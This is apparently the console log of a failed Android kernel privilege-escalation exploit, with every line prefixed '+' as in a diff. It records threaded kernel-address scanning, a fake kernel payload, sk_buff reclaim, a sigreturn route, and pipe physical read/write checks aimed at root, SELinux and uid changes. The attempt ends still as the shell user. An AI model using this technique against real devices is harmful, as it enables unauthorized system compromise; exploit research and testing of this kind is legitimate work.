+[33m[*] [0m[  5] tested 2200000 candidates, scanning=0xffffffa87ac48f00
+[33m[*] [0m[  4] tested 1500000 candidates, scanning=0xffffffa053b48f00
+[33m[*] [0m[  7] tested 1100000 candidates, scanning=0xffffffb83d624740
+[33m[*] [0m[  3] tested 1400000 candidates, scanning=0xffffff984e1fff80
+[33m[*] [0m[  5] tested 2300000 candidates, scanning=0xffffffa8805921c0
+[33m[*] [0m[  4] tested 1600000 candidates, scanning=0xffffffa0594921c0
+[33m[*] [0m[  6] tested 1700000 candidates, scanning=0xffffffb05eddb480
+[33m[*] [0m[  2] tested 1700000 candidates, scanning=0xffffff905eddb480
+[33m[*] [0m[  5] tested 2400000 candidates, scanning=0xffffffa885edb480
+[33m[*] [0m[  7] tested 1200000 candidates, scanning=0xffffffb842f6da00
+[33m[*] [0m[  4] tested 1700000 candidates, scanning=0xffffffa05eddb480
+[33m[*] [0m[  1] tested 1100000 candidates, scanning=0xffffff883d624740
+[33m[*] [0m[  0] tested 1200000 candidates, scanning=0xffffff8042f6da00
+[33m[*] [0m[  6] tested 1800000 candidates, scanning=0xffffffb064724740
+[33m[*] [0m[  2] tested 1800000 candidates, scanning=0xffffff9064724740
+[33m[*] [0m[  5] tested 2500000 candidates, scanning=0xffffffa88b824740
+[33m[*] [0m[  7] tested 1300000 candidates, scanning=0xffffffb8488b6cc0
+[33m[*] [0m[  1] tested 1200000 candidates, scanning=0xffffff8842f6da00
+[33m[*] [0m[  3] tested 1500000 candidates, scanning=0xffffff9853b48f00
+[33m[*] [0m[  4] tested 1800000 candidates, scanning=0xffffffa064724740
+[33m[*] [0m[  5] tested 2600000 candidates, scanning=0xffffffa89116da00
+[33m[*] [0m[  6] tested 1900000 candidates, scanning=0xffffffb06a06da00
+[33m[*] [0m[  2] tested 1900000 candidates, scanning=0xffffff906a06da00
+[33m[*] [0m[  0] tested 1300000 candidates, scanning=0xffffff80488b6cc0
+[33m[*] [0m[  5] tested 2700000 candidates, scanning=0xffffffa896ab6cc0
+[33m[*] [0m[  6] tested 2000000 candidates, scanning=0xffffffb06f9b6cc0
+[33m[*] [0m[  2] tested 2000000 candidates, scanning=0xffffff906f9b6cc0
+[33m[*] [0m[  1] tested 1300000 candidates, scanning=0xffffff88488b6cc0
+[33m[*] [0m[  0] tested 1400000 candidates, scanning=0xffffff804e1fff80
+[33m[*] [0m[  6] tested 2100000 candidates, scanning=0xffffffb0752fff80
+[33m[*] [0m[  2] tested 2100000 candidates, scanning=0xffffff90752fff80
+[33m[*] [0m[  0] tested 1500000 candidates, scanning=0xffffff8053b48f00
+[33m[*] [0m[  6] tested 2200000 candidates, scanning=0xffffffb07ac48f00
+[33m[*] [0m[  2] tested 2200000 candidates, scanning=0xffffff907ac48f00
+[33m[*] [0m[  5] tested 2800000 candidates, scanning=0xffffffa89c3fff80
+[33m[*] [0m[  0] tested 1600000 candidates, scanning=0xffffff80594921c0
+[33m[*] [0m[  6] tested 2300000 candidates, scanning=0xffffffb0805921c0
+[33m[*] [0m[  7] tested 1400000 candidates, scanning=0xffffffb84e1fff80
+[33m[*] [0m[  2] tested 2300000 candidates, scanning=0xffffff90805921c0
+[33m[*] [0m[  4] tested 1900000 candidates, scanning=0xffffffa06a06da00
+[33m[*] [0m[  3] tested 1600000 candidates, scanning=0xffffff98594921c0
+[33m[*] [0m[  0] tested 1700000 candidates, scanning=0xffffff805eddb480
+[33m[*] [0m[  6] tested 2400000 candidates, scanning=0xffffffb085edb480
+[33m[*] [0m[  2] tested 2400000 candidates, scanning=0xffffff9085edb480
+[33m[*] [0m[  6] tested 2500000 candidates, scanning=0xffffffb08b824740
+[33m[*] [0m[  2] tested 2500000 candidates, scanning=0xffffff908b824740
+[33m[*] [0m[  0] tested 1800000 candidates, scanning=0xffffff8064724740
+[33m[*] [0m[  1] tested 1400000 candidates, scanning=0xffffff884e1fff80
+[33m[*] [0m[  5] tested 2900000 candidates, scanning=0xffffffa8a1d48f00
+[33m[*] [0m[  6] tested 2600000 candidates, scanning=0xffffffb09116da00
+[33m[*] [0m[  2] tested 2600000 candidates, scanning=0xffffff909116da00
+[33m[*] [0m[  0] tested 1900000 candidates, scanning=0xffffff806a06da00
+[33m[*] [0m[  2] tested 2700000 candidates, scanning=0xffffff9096ab6cc0
+[33m[*] [0m[  6] tested 2700000 candidates, scanning=0xffffffb096ab6cc0
+[33m[*] [0m[  7] tested 1500000 candidates, scanning=0xffffffb853b48f00
+[33m[*] [0m[  0] tested 2000000 candidates, scanning=0xffffff806f9b6cc0
+[33m[*] [0m[  1] tested 1500000 candidates, scanning=0xffffff8853b48f00
+[33m[*] [0m[  6] tested 2800000 candidates, scanning=0xffffffb09c3fff80
+[33m[*] [0m[  7] tested 1600000 candidates, scanning=0xffffffb8594921c0
+[33m[*] [0m[  4] tested 2000000 candidates, scanning=0xffffffa06f9b6cc0
+[33m[*] [0m[  2] tested 2800000 candidates, scanning=0xffffff909c3fff80
+[33m[*] [0m[  5] tested 3000000 candidates, scanning=0xffffffa8a76921c0
+[33m[*] [0m[  3] tested 1700000 candidates, scanning=0xffffff985eddb480
+[33m[*] [0m[  6] tested 2900000 candidates, scanning=0xffffffb0a1d48f00
+[33m[*] [0m[  7] tested 1700000 candidates, scanning=0xffffffb85eddb480
+[33m[*] [0m[  1] tested 1600000 candidates, scanning=0xffffff88594921c0
+[33m[*] [0m[  4] tested 2100000 candidates, scanning=0xffffffa0752fff80
+[33m[*] [0m[  7] tested 1800000 candidates, scanning=0xffffffb864724740
+[33m[*] [0m[  3] thread done, tested 1712818 candidates
+[33m[*] [0m[  4] thread done, tested 2113265 candidates
+[33m[*] [0m[  1] thread done, tested 1600000 candidates
+[33m[*] [0m[  5] thread done, tested 3041345 candidates
+[33m[*] [0m[  2] thread done, tested 2853877 candidates
+[33m[*] [0m[  6] thread done, tested 2940082 candidates
+[33m[*] [0m[  7] thread done, tested 1800000 candidates
+[33m[*] [0m[  0] thread done, tested 2071453 candidates
+[33m[*] [0mprepare_kernel_page leaked_mm=ffffff80739830c0 base=ffffff8073980000 mode=0
+[33m[*] [0mfake payload mode=0 write_shape=1 lock=ffffff80739804d0 w0=ffffff80739813a0 task=ffffff8073982380 write_parent=ffffff8042ee9108 write_right=0000000000000000 write_left=0000000000000000
+[33m[*] [0msk_buff reclaim send 1/4 ret=65536 errno=0
+[33m[*] [0msk_buff reclaim send 2/4 ret=65536 errno=0
+[33m[*] [0msk_buff reclaim send 3/4 ret=65536 errno=0
+[33m[*] [0msk_buff reclaim send 4/4 ret=65536 errno=0
+[33m[*] [0mdone
+[32m[+] [0mckpt: sigret attempt=2 before prctl+sigreturn shape=1 target=ffffff8042ee9110
+[32m[+] [0mckpt: sigret hold done attempt=2 prctl_ret=-1 prctl_errno=22 calls=1 walks=0 proof=bootid(alias) shape=1 tree_pc=ffffff8042ee9108 tree_right=ffffff8073980180 task=ffffff8073982380 target=ffffff8042ee9110
+[32m[+] [0mckpt: consumer walk seq=2 call=0 ret=0 errno=0 policy=3->0(want 0) nice=19 walked=1 armed=1/0 tid=12126
+[32m[+] [0mckpt: consumer seq=2 done calls=0 walked=1
+[32m[+] [0mckpt: BOOTID-WRITE-PROOF attempt=2 walks=0 before=2bf821e8-684c-4686-9a6b-54269be64812 after=2bf821e8-684c-4686-9a6b-54269be64812 walk_wrote=0
+[32m[+] [0mckpt: sigret route done (no write landed)
+[32m[+] [0mckpt: route done
+[32m[+] [0mpipe-physrw-summary pid=6631 done=0 root=0 kaslr=1 base=ffffff8040000000 slide=0000000000000000
+[32m[+] [0mpipe physrw pid=6631 done=0 root=0 kaslr=1 read_ok=0 write_ok=0 rw64=0/0 uid=4294967295->4294967295 sid=4294967295/4294967295->4294967295/4294967295 selinux=255->255 setgid=-1 setuid=-1 setenforce=-1/0
+uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),1078(ext_data_rw),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid),3012(readtracefs) context=u:r:shell:s0
